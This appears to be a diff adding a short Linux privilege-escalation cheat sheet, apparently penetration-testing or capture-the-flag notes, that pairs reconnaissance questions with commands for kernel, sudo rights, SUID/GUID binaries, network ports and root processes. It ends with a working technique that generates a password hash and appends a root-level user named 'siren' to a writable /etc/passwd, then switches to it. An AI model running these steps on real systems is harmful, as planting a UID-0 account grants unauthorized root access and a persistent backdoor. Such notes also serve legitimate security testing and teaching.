@@ -1,0 +1,34 @@
+Kernel?
+uname -a
+
+Issue/Release?
+cat /etc/issue
+cat /etc/*-release
+
+Are we a real user?
+sudo -l
+ls -lsaht /etc/sudoers
+
+Are any users a member of exotic groups?
+groups <user>
+
+SUID Binaries?
+find / -perm -u=s -type f 2>/dev/null
+
+GUID Binaries?
+find / -perm -g=s -type f 2>/dev/null
+
+What does the local network look like?
+netstat -antup
+netstat -tunlp
+
+Is anything vulnerable running as root?
+ps aux |grep -i 'root' --color=auto
+
+Can we write as a low-privileged user to /etc/passwd?
+openssl passwd -1
+i<3hacking
+$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
+echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
+su siren
+id
